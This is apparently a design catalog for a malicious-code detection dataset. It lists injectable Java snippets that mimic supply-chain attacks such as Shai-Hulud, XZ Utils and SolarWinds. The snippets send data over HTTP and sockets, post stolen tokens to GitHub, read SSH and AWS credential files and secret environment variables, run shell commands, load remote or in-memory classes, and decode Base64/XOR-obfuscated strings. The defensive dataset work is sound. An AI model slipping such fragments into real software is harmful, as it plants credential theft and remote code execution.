# Java Mutation Snippet Catalog

Each snippet below is a behavioural analogue of a code-level property observed in a
high-impact supply-chain attack (see `patterns-in-supplychain-attacks.md`, bold cells).
Snippets are *injectable statement fragments* — they are meant to be spliced into an
existing benign method body via javassist, so they use fully-qualified type names and
`<name>` placeholders. They exercise the real sensitive APIs (so the property is visible
in the bytecode) but with **inert targets**: loopback / `example.com` hosts, placeholder
keys, no live exfiltration.

Several of the original attacks are written in C (XZ Utils), C#/.NET (SolarWinds) or
JavaScript (Shai-Hulud, event-stream, Axios). Where there is no literal Java equivalent,
the snippet maps the behaviour to the closest JVM mechanism and the mapping is stated in
the snippet's description (e.g. IFUNC hooking → native library load / indirect reflective
dispatch; `.NET` assembly load → `ClassLoader`; `eval()` / `require()` → `javax.script`
and dynamic class loading; `os.platform()` → `System.getProperty`).


### Structure

Snippets have unique generated ids such as `fsaccess/del/io`.

Each code injection pattern is described by a Java short code snippet. The code snippet may contain variables, such as `<name>`. 

Those are to be instantiated as follows:

- `<name>` can be a constant, such as `"foo.txt"`
- `<name>` can be a string method argument, such as `$1` or `$2`. This should be informed by the signature of the method to be mutated. The variable syntax is described in the [javassist tutorial](https://www.javassist.org/tutorial/tutorial2.html#before).
- `<name>` can be a stringified non-string method argument, such as  `$0.toString()` (if `$0` is an object) or `$1.get(0).toString()` (if `$1` is a list) etc
- `<name>` can be a heap reference (i.e. reference to a field), such as  `$0.field`

Note that for constant generation, we may want to use a [quickcheck - style generator](https://pholser.github.io/junit-quickcheck/site/1.0/usage/other-types.html) (and can reuse existing generators from [this library](https://pholser.github.io/junit-quickcheck)).  I.e. we would have generators for "file names", "IP addresses" etc.  

We should avoid to always wrap code in `try-catch` as this may lead to overfitting when we use this for training data. However, there are operations that may run into a `SecurityException` like `File::delete`. Here it would make some sense to sometimes catch those, or some supertype. This could be another variation point. 

Code snippets should always use fully qualified type names as we will compile them into bytecode anyway.

Some snippets perform operations that may throw *checked* exceptions (`IOException`,
`GeneralSecurityException`, `ReflectiveOperationException`, `ScriptException`,
`InterruptedException`). Following the note above, we do **not** always wrap these in
`try-catch`; the catch is itself a variation point. The bare form (no catch) only compiles
when injected into a method that already declares the matching `throws`, so the
try-catch variant should be selected often enough to keep injection sites flexible.


### Placeholder kinds used in this catalog

| Placeholder | Meaning / typical inert instantiation |
|---|---|
| `<url>`, `<host>`, `<port>` | exfil / C2 endpoint — `"http://127.0.0.1:8080/c"`, `"127.0.0.1"`, `8080` |
| `<payload>` | data to send (a `String`; often `$1`, `$0.toString()` or a field) |
| `<token>` | harvested credential used as an auth header |
| `<secretfile>`, `<dir>`, `<suffix>` | file path / directory / filename filter |
| `<key>`, `<nonce>`, `<ciphertext>`, `<publicKey>`, `<signature>`, `<message>` | crypto material |
| `<name>`, `<blocklisthash>` | string to hash and its expected blocklist hash |
| `<envname>`, `<propname>` | environment-variable / system-property key |
| `<cmd>`, `<cmdarray>`, `<libpath>`, `<libname>` | command / native-library to run or load |
| `<classname>`, `<jarurl>`, `<bytecode>`, `<methodname>`, `<enginename>`, `<script>` | reflection / dynamic-loading inputs |
| `<b64data>`, `<b64part1>`, `<b64part2>`, `<xorconst>` | obfuscated string material |


### Data exfiltration / Network IO

Analogue of: Shai-Hulud (*GitHub API + HTTP*) and event-stream (*HTTP POST*).

#### netio/post/httpurlconnection

Exfiltrating data with an HTTP `POST` via `java.net.HttpURLConnection`.

```java
java.net.HttpURLConnection conn = (java.net.HttpURLConnection) new java.net.URL(<url>).openConnection();
conn.setRequestMethod("POST");
conn.setDoOutput(true);
conn.getOutputStream().write(<payload>.getBytes(java.nio.charset.StandardCharsets.UTF_8));
conn.getResponseCode();
```

#### netio/post/httpclient

Exfiltrating data with an HTTP `POST` via the `java.net.http` client (Java 11+). The
`send` call throws checked exceptions, so this variant catches them.

```java
try {
	java.net.http.HttpClient.newHttpClient().send(
		java.net.http.HttpRequest.newBuilder(java.net.URI.create(<url>))
			.POST(java.net.http.HttpRequest.BodyPublishers.ofString(<payload>))
			.build(),
		java.net.http.HttpResponse.BodyHandlers.discarding());
} catch (java.io.IOException | InterruptedException e) {}
```

#### netio/exfil/githubapi

Posting harvested secrets to the GitHub REST API with a stolen token in the
`Authorization` header (Shai-Hulud created attacker-controlled repositories this way).

```java
java.net.HttpURLConnection conn = (java.net.HttpURLConnection) new java.net.URL("https://api.github.com/user/repos").openConnection();
conn.setRequestMethod("POST");
conn.setRequestProperty("Authorization", "token " + <token>);
conn.setRequestProperty("Accept", "application/vnd.github+json");
conn.setDoOutput(true);
conn.getOutputStream().write(<payload>.getBytes(java.nio.charset.StandardCharsets.UTF_8));
conn.getResponseCode();
```

#### netio/exfil/socket

Low-level C2 beacon: writing data to a raw TCP socket.

```java
java.net.Socket socket = new java.net.Socket(<host>, <port>);
socket.getOutputStream().write(<payload>.getBytes(java.nio.charset.StandardCharsets.UTF_8));
socket.close();
```

#### netio/download/get

Downloading a second-stage payload with an HTTP `GET` (Axios curl/PowerShell download).

```java
byte[] payload;
try (java.io.InputStream in = new java.net.URL(<url>).openStream()) {
	payload = in.readAllBytes();
}
```


### File system access

#### fsaccess/del/io

Deleting a file with `java.io`. 


```java
java.io.File file = new java.io.File(<filename>);
file.delete();
```

#### fsaccess/del/nio

Deleting a file with `java.nio`.

```java
java.nio.file.Path path = java.nio.file.Paths.get("<filename>");
try {
	java.nio.file.Files.delete(path);
} catch (IOException e) {}
```

#### fsaccess/readsecret/io

Reading a credential-bearing file with `java.io` (analogue of Shai-Hulud reading
`.npmrc` / `.env` / `.git-credentials`; in the Java ecosystem `<secretfile>` is typically
`System.getProperty("user.home") + "/.m2/settings.xml"`, `"/.gitconfig"`,
`"/.ssh/id_rsa"` or `"/.aws/credentials"`).

```java
java.io.File file = new java.io.File(<secretfile>);
byte[] data = new byte[(int) file.length()];
try (java.io.FileInputStream in = new java.io.FileInputStream(file)) {
	in.read(data);
}
```

#### fsaccess/readsecret/nio

Reading a credential-bearing file with `java.nio`.

```java
byte[] data = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(<secretfile>));
```

#### fsaccess/enum/walk

Enumerating a directory tree to discover secrets (Axios-style directory enumeration /
credential hunting).

```java
java.util.List<java.nio.file.Path> hits = java.nio.file.Files.walk(java.nio.file.Paths.get(<dir>))
	.filter(p -> p.getFileName().toString().endsWith(<suffix>))
	.collect(java.util.stream.Collectors.toList());
```



### Crypto API usage

Analogue of: XZ Utils (*ChaCha20 + Ed448*) and SolarWinds (*FNV-1a + XOR hashing*).

#### crypto/decrypt/chacha20

Decrypting a downloaded payload with ChaCha20-Poly1305 (Java 11+), as the XZ backdoor
decrypted its command blob with ChaCha20.

```java
javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("ChaCha20-Poly1305");
cipher.init(javax.crypto.Cipher.DECRYPT_MODE,
	new javax.crypto.spec.SecretKeySpec(<key>, "ChaCha20"),
	new javax.crypto.spec.IvParameterSpec(<nonce>));
byte[] plaintext = cipher.doFinal(<ciphertext>);
```

#### crypto/verify/ed448

Verifying an attacker-controlled signature with Ed448 (Java 15+) before acting on a
payload — the XZ backdoor verified its command with a hard-coded Ed448 key.

```java
java.security.Signature sig = java.security.Signature.getInstance("Ed448");
sig.initVerify(<publicKey>);
sig.update(<message>);
boolean ok = sig.verify(<signature>);
```

#### crypto/hash/fnv1a

Hashing a process / service name with FNV-1a (64-bit) followed by an XOR, then comparing
against a hard-coded blocklist hash — exactly the detection-evasion scheme SUNBURST used
(XOR constant `6605813339339102567`).

```java
long hash = 0xcbf29ce484222325L;
for (byte b : <name>.getBytes(java.nio.charset.StandardCharsets.UTF_8)) {
	hash ^= (b & 0xff);
	hash *= 0x100000001b3L;
}
hash ^= 6605813339339102567L;
boolean blocked = (hash == <blocklisthash>);
```

#### crypto/hash/digest

The same name-hashing idea using a JDK `MessageDigest` (e.g. `"MD5"` or `"SHA-256"`)
instead of a hand-rolled hash.

```java
java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
byte[] digest = md.digest(<name>.getBytes(java.nio.charset.StandardCharsets.UTF_8));
```


### System/Environment Reconnaissance 

Analogue of: XZ Utils (*env vars*) and Axios (*os.platform()*).

#### recon/env/getenv

Reading a single, security-relevant environment variable (CI/secret harvesting; `<envname>`
e.g. `"GITHUB_TOKEN"`, `"AWS_SECRET_ACCESS_KEY"`, `"NPM_TOKEN"`).

```java
String value = System.getenv(<envname>);
```

#### recon/env/getenvall

Enumerating the entire environment block (Shai-Hulud / TruffleHog-style bulk secret
harvesting from CI environment variables).

```java
java.util.Map<String, String> env = System.getenv();
```

#### recon/os/property

Fingerprinting the host via a system property — the JVM equivalent of `os.platform()`
(`<propname>` e.g. `"os.name"`, `"os.arch"`, `"os.version"`, `"user.name"`,
`"java.version"`).

```java
String value = System.getProperty(<propname>);
```

#### recon/os/platformbranch

Branching on the detected OS to select a platform-specific routine, mirroring the Axios
dropper dispatching on `os.platform()`.

```java
String platform = System.getProperty("os.name").toLowerCase();
if (platform.contains("win")) { <winaction> }
else if (platform.contains("mac")) { <macaction> }
else { <nixaction> }
```


### Process/Memory Manipulation

Analogue of: XZ Utils (*IFUNC hooking, `system()`*). The literal IFUNC trick (redirecting a
libc PLT entry to attacker code via the dynamic linker) has no Java equivalent; the closest
JVM mechanism for getting native code running inside the process is loading a native
library, which is covered here. Command execution maps directly to `Runtime.exec` /
`ProcessBuilder`.

#### procmem/exec/runtime

Executing a system command, mirroring the XZ backdoor passing its decrypted command to
`system()`.

```java
Process process = Runtime.getRuntime().exec(<cmd>);
```

#### procmem/exec/processbuilder

Executing a system command via `ProcessBuilder` (`<cmdarray>` e.g.
`new String[]{"/bin/sh", "-c", <cmd>}`).

```java
Process process = new ProcessBuilder(<cmdarray>).start();
```

#### procmem/nativeload/load

Loading a native library into the JVM process — the closest JVM analogue to IFUNC-style
injection of native code into the running process.

```java
System.load(<libpath>);
```


### Reflection/Classloading

Analogue of: SolarWinds (*.NET assembly loading*), Shai-Hulud (*`eval()`, dynamic
`require()`*) and XZ Utils (*IFUNC, analogous*). `.NET` assembly loading and dynamic
`require()` map to JVM class loading; `eval()` maps to `javax.script`; the IFUNC indirect
function resolution maps to runtime method resolution + invocation.

#### reflect/load/classforname

Loading and instantiating a class chosen at runtime by name (analogue of dynamic
`require()` / `Assembly.Load`).

```java
Class<?> clazz = Class.forName(<classname>);
Object instance = clazz.getDeclaredConstructor().newInstance();
```

#### reflect/load/urlclassloader

Loading a class from a remote or downloaded JAR — closest analogue to SUNBURST loading a
.NET assembly from disk / bytes.

```java
java.net.URLClassLoader loader = new java.net.URLClassLoader(
	new java.net.URL[]{ new java.net.URL(<jarurl>) });
Class<?> clazz = loader.loadClass(<classname>);
```

#### reflect/load/defineclass

Defining a class directly from in-memory bytes obtained at runtime (analogue of loading a
downloaded assembly / in-memory payload), reflectively reaching the protected
`ClassLoader.defineClass`.

```java
java.lang.reflect.Method define = ClassLoader.class.getDeclaredMethod(
	"defineClass", String.class, byte[].class, int.class, int.class);
define.setAccessible(true);
Class<?> clazz = (Class<?>) define.invoke(
	ClassLoader.getSystemClassLoader(), <classname>, <bytecode>, 0, <bytecode>.length);
```

#### reflect/invoke/reflection

Resolving a method by name at runtime and invoking it — the managed-runtime analogue of
IFUNC indirect function resolution.

```java
java.lang.reflect.Method method = <obj>.getClass().getMethod(<methodname>, <paramtypes>);
Object result = method.invoke(<obj>, <args>);
```

#### reflect/invoke/methodhandle

The same indirect dispatch via `java.lang.invoke` method handles.

```java
java.lang.invoke.MethodHandle handle = java.lang.invoke.MethodHandles.lookup()
	.findVirtual(<targetclass>, <methodname>,
		java.lang.invoke.MethodType.methodType(<rettype>, <argtypes>));
Object result = handle.invoke(<receiver>, <args>);
```

#### reflect/eval/scriptengine

Evaluating source code at runtime through `javax.script` — the JVM analogue of `eval()`
(`<enginename>` e.g. `"js"` / `"nashorn"`; the decoded `<script>` typically comes from an
obfuscation snippet).

```java
javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName(<enginename>);
Object result = engine.eval(<script>);
```


### Obfuscation

Analogue of: Shai-Hulud (*Base64 + XOR, split `atob`*) and Axios (*reversed Base64 + XOR*).
These snippets decode a hidden string (typically a URL, command or class name later
consumed by another snippet).

#### obfusc/strsplit/concat

Hiding a sensitive constant by splitting it across concatenated string literals (the
"split `atob`" idea applied to the literal itself).

```java
String hidden = <b64part1> + <b64part2> + <b64part3>;
```

#### obfusc/decode/base64

Base64-decoding a (split) literal into a usable string.

```java
byte[] decoded = java.util.Base64.getDecoder().decode(<b64part1> + <b64part2>);
String text = new String(decoded, java.nio.charset.StandardCharsets.UTF_8);
```

#### obfusc/decode/base64xor

Base64-decode followed by an XOR with a repeating key (Shai-Hulud Base64 + XOR; `<key>`
e.g. `"OrDeR_7077".getBytes(java.nio.charset.StandardCharsets.UTF_8)`).

```java
byte[] data = java.util.Base64.getDecoder().decode(<b64data>);
for (int i = 0; i < data.length; i++) {
	data[i] ^= <key>[i % <key>.length];
}
String text = new String(data, java.nio.charset.StandardCharsets.UTF_8);
```

#### obfusc/decode/reversedbase64xor

Reverse the string, Base64-decode it, then XOR with a key plus a constant — the exact
shape used by the Axios dropper (XOR key `OrDeR_7077`, constant `333`).

```java
byte[] data = java.util.Base64.getDecoder().decode(
	new StringBuilder(<b64data>).reverse().toString());
for (int i = 0; i < data.length; i++) {
	data[i] ^= (byte) (<xorconst> ^ <key>[i % <key>.length]);
}
String text = new String(data, java.nio.charset.StandardCharsets.UTF_8);
```
